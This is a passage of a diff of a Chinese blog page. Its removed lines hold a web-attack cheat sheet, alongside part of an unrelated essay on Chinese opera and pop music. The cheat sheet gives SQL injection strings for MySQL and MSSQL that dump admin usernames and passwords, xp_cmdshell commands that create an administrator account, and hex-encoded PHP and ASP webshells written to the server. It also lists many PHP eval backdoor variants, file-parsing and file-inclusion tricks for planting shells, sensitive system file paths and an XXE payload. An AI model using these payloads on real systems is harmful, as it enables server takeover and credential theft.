- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r41">
-<td class="x73">//查内容</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r42">
-<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select id,username,password from users</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r43">
-<td class="x73">//查询FILE_PRIV权限</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r44">
-<td class="x73">select HOST,USER,FILE_PRIV from mysql.user;</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r45">
-<td class="x73">//设置FILE_PRIV权限（语句执行完成需重启mysql服务生效）</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r46">
-<td class="x73">UPDATE mysql.user SET File_priv = 'Y';</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r47">
-<td class="x73">FLUSH PRIVILEGES;</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r48">
-<td class="x73">//读取文件</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r49">
-<td class="x73">select load_file('C:\\boot.ini');</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r50">
-<td class="x73">select load_file(0xhex);</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r51">
-<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select 1,2,load_file('C:\\boot.ini');</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r52">
-<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select 1,2,load_file(0xhex);</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r53">
-<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select 1,2,load_file(0x433A5C5C70687053747564795C5C5757575C5C73716C696E6A6563745C5C66616E322E706870);</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r54">
-<td class="x73">//写入文件</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r55">
-<td class="x73">select 0x3C3F70687020406576616C28245F504F53545B2770617373275D293B3F3E into outfile 'C:\\phpStudy\\WWW\\caidao.php';</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r56">
-<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select 1,2,0x3C3F70687020406576616C28245F504F53545B2770617373275D293B3F3E into outfile 'C:\\phpStudy\\WWW\\www.secdic.com.php';</td>
- </tr>
- <tr height="20" class="x70" style="mso-height-source:userset;height:15.6pt" id="r57">
-<td height="20" class="x75" style="height:15.6pt;"></td>
-<td class="x75"></td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r58">
-<td rowspan="42" height="873" class="x72" style="height:655.200000000001pt;">ASP+MSSQL注入</td>
-<td class="x73">http://localhost:83/looknews.asp?id=20 and user&gt;0</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r59">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and (select count(*) from sysobjects)&gt;0</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r60">
-<td class="x73">http://localhost:83/looknews.asp?id=20;declare @a int—</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r61">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and (select @@version)&gt;0;--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r62">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and 1=(select @@VERSION);--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r63">
-<td class="x73">判断当前数据库：</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r64">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and db_name()&gt;0;--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r65">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and 1=(select db_name());--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r66">
-<td class="x73">获取机器名：</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r67">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and 1=(select @@servername);--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r68">
-<td class="x73">判断是否为sa权限：</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r69">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and 1=(select is_member('db_owner'));--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r70">
-<td class="x73">判断是否有master库读取权限：</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r71">
-<td class="x73">http://localhost:83/looknews.asp?id=20and 1= (select HAS_DBACCESS('master'));--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r72">
-<td class="x73">暴库：</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r73">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and 1=(select name from master.dbo.sysdatabases where dbid=1);--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r74">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and 1=(select name from master.dbo.sysdatabases where dbid=2);--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r75">
-<td class="x73">暴表：</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r76">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 name from sysobjects where xtype='u' and status&gt;0 )&gt;0;--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r77">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 name from sysobjects where xtype='u' and status&gt;0 and name not in('bigclass'))&gt;0;--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r78">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 name from sysobjects where xtype='u' and status&gt;0 and name not in('bigclass','admin'))&gt;0;--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r79">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 name from sysobjects where xtype='u' and status&gt;0 and name not in('bigclass','admin','class'))&gt;0;--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r80">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 name from sysobjects where xtype='u' and status&gt;0 and name not in('bigclass','admin','class','D99_CMD'))&gt;0;--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r81">
-<td class="x73">暴列：</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r82">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and (Select Top 1 col_name(object_id('admin'),1) from sysobjects)&gt;0;--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r83">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and (Select Top 1 col_name(object_id('admin'),2) from sysobjects)&gt;0;--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r84">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and (Select Top 1 col_name(object_id('admin'),3) from sysobjects)&gt;0;--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r85">
-<td class="x73">暴内容：</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r86">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 username from admin)&gt;0;--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r87">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 pass from admin)&gt;0;--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r88">
-<td class="x73">暴第2条内容：</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r89">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 username from admin where username not in (select top 1 username from admin))&gt;0;--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r90">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 pass from admin where pass not in (select top 1 pass from admin))&gt;0;--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r91">
-<td class="x73">暴第3条内容：</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r92">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 username from admin where username not in (select top 2 username from admin))&gt;0;--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r93">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 pass from admin where pass not in (select top 2 pass from admin))&gt;0;--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r94">
-<td class="x73">xp_cmdshell扩展存储过程执行命令：</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r95">
-<td class="x73">http://localhost:83/looknews.asp?id=20 and 1=(Select count(*) FROM master.dbo.sysobjects Where xtype = 'X' AND name = 'xp_cmdshell');--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r96">
-<td class="x73">http://localhost:83/looknews.asp?id=20;exec master.dbo.xp_cmdshell 'net user cmdshell cmdshell /add';--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r97">
-<td class="x73">http://localhost:83/looknews.asp?id=20;exec master.dbo.xp_cmdshell 'net localgroup administrators cmdshell /add';--</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r98">
-<td class="x73">sp_makewebtask扩展存储过程导出一句话：</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r99">
-<td class="x73">http://localhost:83/looknews.asp?id=20;exec sp_makewebtask 'c:\Inetpub\wwwroot\www.secdic.com.asp','select''&lt;%25eval request("pass")%25&gt;''';--</td>
- </tr>
- <tr height="20" class="x69" style="mso-height-source:userset;height:15.6pt" id="r100">
-<td height="20" class="x75" style="height:15.6pt;"></td>
-<td class="x76"></td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r101">
-<td rowspan="10" height="1240" class="x72" style="height:930.6pt;">PHP代码执行函数总结</td>
-<td class="x73">&lt;?php @eval($_REQUEST[cmd]);?&gt;</td>
- </tr>
- <tr height="80" style="mso-height-source:userset;height:60pt" id="r102">
-<td class="x77">&lt;?php <br>//?cmd=phpinfo()<br>assert($_REQUEST[cmd]); <br>?&gt;</td>
- </tr>
- <tr height="80" style="mso-height-source:userset;height:60pt" id="r103">
-<td class="x77">&lt;?php <br>//?cmd=phpinfo()<br>@preg_replace("/abc/e",$_REQUEST['cmd'],"abcd");<br>?&gt;</td>
- </tr>
- <tr height="100" style="mso-height-source:userset;height:75pt" id="r104">
-<td class="x78">&lt;?php <br>//?cmd=phpinfo();<br>$func =create_function('',$_REQUEST['cmd']);<br>$func();<br>?&gt;</td>
- </tr>
- <tr height="160" style="mso-height-source:userset;height:120pt" id="r105">
-<td class="x78">&lt;?php<br>//?func=system&amp;cmd=whoami<br>$func=$_GET['func'];<br>$cmd=$_GET['cmd'];<br>$array[0]=$cmd;<br>$new_array=array_map($func,$array);<br>//print_r($new_array);<br>?&gt;</td>
- </tr>
- <tr height="220" style="mso-height-source:userset;height:165pt" id="r106">
-<td class="x78">&lt;?php <br>//?cmd=phpinfo()<br>@call_user_func(assert,$_GET['cmd']);<br>?&gt;<br><br>&lt;?php <br>//?cmd=phpinfo()<br>$cmd=$_GET['cmd'];<br>$array[0]=$cmd;<br>call_user_func_array("assert",$array);<br>?&gt;</td>
- </tr>
- <tr height="140" style="mso-height-source:userset;height:105pt" id="r107">
-<td class="x78">&lt;?php <br>//?func=system&amp;cmd=whoami<br>$cmd=$_GET['cmd'];<br>$array1=array($cmd);<br>$func =$_GET['func'];<br>array_filter($array1,$func);<br>?&gt;</td>
- </tr>
- <tr height="220" style="mso-height-source:userset;height:165pt" id="r108">
-<td class="x78">php环境&gt;=5.6才能用<br>&lt;?php usort(...$_GET);?&gt;<br>利用方式：<br>test.php?1[]=1-1&amp;1[]=eval($_POST['x'])&amp;2=assert<br>[POST]:x=phpinfo();<br><br>php环境&gt;=5.6才能用<br>&lt;?php usort($_GET,'asse'.'rt');?&gt;<br>利用方式：<br>test.php?1=1+1&amp;2=eval($_POST[x])<br>[POST]:x=phpinfo();</td>
- </tr>
- <tr height="140" style="mso-height-source:userset;height:105pt" id="r109">
-<td class="x78">&lt;?php <br>$test='&lt;?php eval($_POST[cmd]);?&gt;';<br>file_put_contents('test1.php',$test);<br>?&gt;<br>&lt;?php <br>fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[cmd])?&gt;'); <br>?&gt;</td>
- </tr>
- <tr height="80" style="mso-height-source:userset;height:60pt" id="r110">
-<td class="x78">&lt;?php <br>//?a=assert&amp;b=phpinfo()<br>$_GET['a']($_GET['b']);<br>?&gt;</td>
- </tr>
- <tr height="20" class="x70" style="mso-height-source:userset;height:15.6pt" id="r111">
-<td height="20" class="x75" style="height:15.6pt;"></td>
-<td class="x75"></td>
- </tr>
- <tr height="40" style="mso-height-source:userset;height:30pt" id="r112">
-<td rowspan="3" height="160" class="x72" style="height:120pt;">IIS5.x-6.x解析漏洞</td>
-<td class="x78">形式：www.xxx.com/xx.asp/xx.jpg<br>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件</td>
- </tr>
- <tr height="40" style="mso-height-source:userset;height:30pt" id="r113">
-<td class="x78">形式：www.xxx.com/xx.asp;.jpg<br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</td>
- </tr>
- <tr height="80" style="mso-height-source:userset;height:60pt" id="r114">
-<td class="x78">IIS6.0 默认的可执行文件除了asp还包含这三种 :<br>/test.asa<br>/test.cer<br>/test.cdx</td>
- </tr>
- <tr height="60" style="mso-height-source:userset;height:45pt" id="r115">
-<td rowspan="2" height="100" class="x72" style="height:75pt;">apache解析漏洞</td>
-<td class="x78">Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php<br>漏洞形式：www.xxxx.xxx.com/test.php.php123</td>
- </tr>
- <tr height="40" style="mso-height-source:userset;height:30pt" id="r116">
-<td class="x78">（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</td>
- </tr>
- <tr height="160" style="mso-height-source:userset;height:120pt" id="r117">
-<td rowspan="2" height="220" class="x72" style="height:165pt;">nginx解析漏洞</td>
-<td class="x78">Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：<br>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了<br>漏洞形式：<br>www.xxxx.com/UploadFiles/image/1.jpg/1.php<br>www.xxxx.com/UploadFiles/image/1.jpg%00.php<br>www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</td>
- </tr>
- <tr height="60" style="mso-height-source:userset;height:45pt" id="r118">
-<td class="x78">另外一种手法：上传一个名字为test.jpg，以下内容的文件。<br>&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[cmd])?&gt;');?&gt;<br>然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。</td>
- </tr>
- <tr height="20" class="x70" style="mso-height-source:userset;height:15.6pt" id="r119">
-<td height="20" class="x75" style="height:15.6pt;"></td>
-<td class="x75"></td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r120">
-<td rowspan="5" height="104" class="x72" style="height:78pt;">windows</td>
-<td class="x71">c:\boot.ini</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r121">
-<td class="x71">c:\windows\systems32\inetsrv\MetaBase.xml</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r122">
-<td class="x71">c:\windows\repair\sam</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r123">
-<td class="x71">c:\windows\php.ini php配置文件</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r124">
-<td class="x71">c:\windows\my.ini mysql配置文件</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r125">
-<td rowspan="5" height="104" class="x72" style="height:78pt;">Linux</td>
-<td class="x71">/etc/passwd</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r126">
-<td class="x71">/usr/local/app/apache2/conf/http.conf</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r127">
-<td class="x71">/usr/local/app/php5/lib/php.ini PHP相关设置</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r128">
-<td class="x71">/etc/httpd/conf/http.conf apache配置文件</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r129">
-<td class="x71">/etc/my.cnf mysql配置文件</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r130">
-<td height="20" class="x71" style="height:15.6pt;">文件包含写webshell</td>
-<td class="x71">&lt;?php fputs(fopen("shell.php","w"),"&lt;?php eval($_POST[cmd]);?&gt;")?&gt;</td>
- </tr>
- <tr height="40" style="mso-height-source:userset;height:30pt" id="r131">
-<td height="40" class="x71" style="height:30pt;">本地包含配合文件上传</td>
-<td class="x78">如果目标服务器关闭了allow_url_fopen，则可以尝试使用本地包含+文件上传<br>上传一个图片木马a.jpg，内容为：&lt;?php fputs(fopen("shell.php","w"),"&lt;?php eval($_POST[cmd]);?&gt;")?&gt;</td>
- </tr>
- <tr height="61" style="mso-height-source:userset;height:46pt" id="r132">
-<td height="61" class="x71" style="height:46pt;">本地包含配合apache日志拿shell</td>
-<td class="x78">apache日志分为access.log与error.log，当我们请求一个url地址时，便会记录在access.log中，但如果访问一个不存在的页面，<br>便会将这个页面写入access.log中。如访问URL:http://www.xxx.com/&lt;?php eval([$_POST]);?&gt;则会将一句话写入到access.log中，<br>但是一般来说，写入到access.log文件中的一句话是被编码的，所以需要抓包绕过，而且利用此漏洞需要知道access.log的地址，不然便没有。</td>
- </tr>
- <tr height="40" style="mso-height-source:userset;height:30pt" id="r133">
-<td height="40" class="x71" style="height:30pt;">利用/proc/self/environ进行包含</td>
-<td class="x78">如：http://www.test.com/view.php?page=../../../../proc/self/environ<br>这是web进程运行时的环境变量，其中有些参数是可以被用户控制的，最常见做法就是在User-Agent中插入一句话。</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r134">
-<td height="20" class="x71" style="height:15.6pt;">php://filter</td>
-<td class="x71">php://filter/read=convert.base64-encode/resource=index.php</td>
- </tr>
- <tr height="60" style="mso-height-source:userset;height:45pt" id="r135">
-<td height="60" class="x71" style="height:45pt;">php://input</td>
-<td class="x78">利用条件：<br>allow_url_include = On。<br>对allow_url_fopen不做要求。</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r136">
-<td height="20" class="x71" style="height:15.6pt;">包含session</td>
-<td class="x79"><a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" target="_parent"><span style="font-size:12pt;color:#000000;font-weight:400;text-decoration:none;text-line-through:none;font-family:"等线";">https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</span></a></td>
- </tr>
- <tr height="120" class="x70" style="mso-height-source:userset;height:90pt" id="r137">
-<td height="120" class="x75" style="height:90pt;overflow:hidden;">XEE:XML的外部实体“xxe”被赋予的值为：file:///etc/passwd。当解析xml文档是，xxe会被替换为file:///ect/passwd的内容。//https://www.cnblogs.com/ESHLkangi/p/9245404.html</td>
-<td class="x80">&lt;?xml cersion="1.0"&gt;<br>&lt;!DOCTYPE hack [<br>&lt;!ENTITY xxe SYSTEM "file:///etc/password"&gt;<br>]&gt;<br><br>&lt;hack&gt;&amp;xxe;&lt;/hack&gt;</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r138">
-<td height="20" class="x81" style="height:15.6pt;"><a href="http://ceye.io" target="_parent"><span style="font-size:12pt;color:#800080;font-weight:400;text-decoration: underline;text-line-through:none;text-underline-style:single;font-family:"等线";">http://ceye.io</span></a></td>
-<td class="x71"></td>
- </tr>
-<![if supportMisalignedColumns]>
- <tr height="0" style="display:none">
-  <td width="281" style="width:210.75pt"></td>
-  <td width="1002" style="width:751.5pt"></td>
- </tr>
- <![endif]>
-</table>
           
+ 
+ 
+ 
+ASP+ACCESS注入
+http://localhost:81/Production
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/04/16/web%E9%9A%8F%E7%AC%94/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1551,28 +949,15 @@
       
         
           
-            <h1 id="浅谈古代戏曲与现代流行音乐的交融"><a href="#浅谈古代戏曲与现代流行音乐的交融" class="headerlink" title="浅谈古代戏曲与现代流行音乐的交融"></a>浅谈古代戏曲与现代流行音乐的交融</h1><p><strong>内容摘要</strong>：笔者想起这个话题是因为前段时间听歌时恰巧听到一首国外的作曲人员将铡美案的包拯念状一段与一段英文流行音乐相结合，听起来觉得是非常的合拍，但总又感到不对味。所以就进行了一些简单的比较方式的探究。本文从两者的区别出发，对将两者融合而产生的艺术作品进行一个简要的探究。</p>
-<p><strong>关键字</strong>：<em>流行音乐</em> <em>古代戏曲</em> <em>交融</em> <em>图一乐</em></p>
-<h2 id="戏曲和现代流行音乐的区别"><a href="#戏曲和现代流行音乐的区别" class="headerlink" title="戏曲和现代流行音乐的区别"></a>戏曲和现代流行音乐的区别</h2><p>要分析两者的融合，须得从两者的区别来说，但也得有侧重点，即这里主要说明的是戏曲相对于流行音乐上的区别。    </p>
-<h3 id="戏曲音乐注重锣鼓经的使用"><a href="#戏曲音乐注重锣鼓经的使用" class="headerlink" title="戏曲音乐注重锣鼓经的使用"></a>戏曲音乐注重锣鼓经的使用</h3><p>戏曲中锣鼓音乐的使用，是按照一定的传统规矩组合起来的，他们是根据剧情编配的合理性来使用锣鼓和节奏的。根据它们产生各种不同的音响和节奏效果，来表达人物情感，烘托人物形象的。因此，在我国的戏曲舞台上，有着各异不同的锣鼓点子，而这些个不同的锣鼓点又有着不同的用法和相互转接的方法。所以说：“不同的锣鼓点引出不同的人物”就在于此。由此可见，戏曲锣鼓它不仅仅是戏曲的“外形式”，而且更是戏曲的灵魂和精髓。</p>
-<p>完整的戏曲音乐曲谱，必然包含锣鼓经。以桂剧音乐为例，桂剧是一个多声腔剧种，包括弹腔、高腔、昆腔、吹腔、杂腔小调，清末以来形成以弹腔为主的格局。这五种声腔，其伴奏乐器、音乐结构、唱词特征、调式音阶各不相同，但都是典型的戏曲音乐。<br>而现代流行音乐或者歌剧，并没有限定在某个阶段进行某种乐器的演奏，这种其实就是艺术格调上的差异。</p>
-<h3 id="戏曲音乐和通俗音乐的唱腔有明显差异"><a href="#戏曲音乐和通俗音乐的唱腔有明显差异" class="headerlink" title="戏曲音乐和通俗音乐的唱腔有明显差异"></a>戏曲音乐和通俗音乐的唱腔有明显差异</h3><p>这里以一首《新贵妃醉酒》进行分析。从呼吸方法来看，在演唱这首歌曲的女声部分时，李玉刚主要运用的是托气的方法；在演唱通俗部分的时候，运用了胸腹式联合式呼吸。从发声共鸣来看，戏曲演唱部分他主要采用头腔和口咽腔共鸣，基本不用胸腔共鸣；通俗歌曲演唱部分则更依赖口腔颌胸腔共鸣。从咬字吐字来看，在演唱戏曲部分时他注重了归韵；在运用通俗唱法演唱的时候，咬字吐字是直接经过口腔送出去，显得非常口语化、亲切自然。</p>
-<p>具体来说，戏曲中的唱腔有昆腔、高腔、梆子腔、京剧、评剧等；而现代流行音乐里的唱腔风格多样，没有固定的模式，演唱风格追求自然、随意。这种差异可以说是非常本质的区别了。</p>
-<p>而更加细节的差异需要声乐方面的专业知识，这里笔者不了解相关知识，就不做赘述了。</p>
-<h3 id="戏曲和流行音乐的表现形式有很大的区别"><a href="#戏曲和流行音乐的表现形式有很大的区别" class="headerlink" title="戏曲和流行音乐的表现形式有很大的区别"></a>戏曲和流行音乐的表现形式有很大的区别</h3><p>戏曲的演出是一种综合的工程，演戏需要有舞台、服装、道具、化妆、灯光、布景；各种角色的演员；还要有乐队的文武场配合。戏曲演员在台上要担任一定的角色，各人要依据自己担任的人物做出恰如其分的说、唱、念、表。戏曲表演在发展中已经形成形式化，不同行当都有各自规范的表演程式。</p>
-<p>在表演上，流行音乐的表现的自由性和游离性强，要求不高，比较简单；而戏曲演员具象化、个性和规范性强。因此戏曲表演更加生动，更感人，更能引人入胜。</p>
-<h3 id="戏曲和通俗音乐的语言有区别"><a href="#戏曲和通俗音乐的语言有区别" class="headerlink" title="戏曲和通俗音乐的语言有区别"></a>戏曲和通俗音乐的语言有区别</h3><p>戏曲一般使用的语言是方言土语，而通俗音乐为了大众理解的需求使用的是社会里标准的语言（普通话），少数的音乐中会点缀外语的单词进行演唱，但是戏曲中绝对不会有这种现象产生。</p>
-<p>上述几个论点的提出，似乎已经已经印证了传统的戏曲和现代的流行音乐是很难进行交融的，但是现如今随着网络的发达和各种新型设备程式的产生，一些音乐艺人对音乐进行创新，将中国传统戏曲和现代流行音乐融合在一起，产生了不少形式的新型音乐作品，一些优秀的作品广为人们传唱，这种作品被称为戏歌。</p>
-<h2 id="古代戏曲和现代流行音乐的交融"><a href="#古代戏曲和现代流行音乐的交融" class="headerlink" title="古代戏曲和现代流行音乐的交融"></a>古代戏曲和现代流行音乐的交融</h2><p>其实能算的上“戏歌”的歌曲都在少数，大部分所谓的将戏曲唱法加到流行音乐中的作品都仅仅是演唱者捏个嗓子唱两句，这种是很差的作品。真正好的将戏曲和现代音乐交融的戏歌需要演唱者和作曲人员两边都要“硬”，这里笔者将一些优秀作品中将中国传统戏曲和现代流行歌曲进行融合的具体策略列举如下。</p>
-<h3 id="在创作现代流行音乐的过程中运用戏曲的音乐元素"><a href="#在创作现代流行音乐的过程中运用戏曲的音乐元素" class="headerlink" title="在创作现代流行音乐的过程中运用戏曲的音乐元素"></a>在创作现代流行音乐的过程中运用戏曲的音乐元素</h3><p>了能够将戏曲与流行音乐进行更好的融合，现代流行歌手在创作过程中可以根据音乐旋律，适当的融入一些戏曲的元素，比如唱腔、伴奏、音乐等等。这样既能够满足听众的需求，还将戏曲元素完美的融入到了音乐当中。在周杰伦的《青花瓷》、王力宏的《花田错》等等音乐作品中，这一理念被充分的体现。在这其中有些作品是在歌曲旋律当中融入了戏曲音乐，有些作品则是运用了传统戏曲中的锣鼓进行伴奏，甚至一些作品把戏曲作为背景音乐进行演唱。但是无论是哪种形式，都完美的将戏曲元素融入到流行音乐当中。</p>
-<h3 id="用戏曲元素渲染演唱氛围"><a href="#用戏曲元素渲染演唱氛围" class="headerlink" title="用戏曲元素渲染演唱氛围"></a>用戏曲元素渲染演唱氛围</h3><p>前文中也提到了，戏曲的表现更加注重了表演的方式，有剧情，从而更加能渲染情感。一些现代音乐作品会根据音乐的旋律把戏曲放在开头，或是用于伴奏等等，从而提高作品的质量。虽然这些戏曲与歌曲并无太大关联，但是却能够起到良好的渲染作用，通过戏曲音乐将听众引入到相应的氛围的当中，为接下来演唱奠定基础。比如在黄阅的《折子戏》中，便应用到了京剧戏曲中《秦香莲》的开场部分，用陈世美的唱腔为整首音乐做引子。虽然这段唱腔和整首音乐没有关联，但是这样的开头方式却为音乐增添了色彩，为整首歌曲营造了良好的气氛。</p>
-<h3 id="在现代流行音乐的歌词当中描写戏曲剧情"><a href="#在现代流行音乐的歌词当中描写戏曲剧情" class="headerlink" title="在现代流行音乐的歌词当中描写戏曲剧情"></a>在现代流行音乐的歌词当中描写戏曲剧情</h3><p>一些歌曲的创作者为了能够更好的融入传统戏曲元素，直接将一些对历史典故的叙述当成歌词，加以适当的配乐和情感演唱，起到了良好的效果。</p>
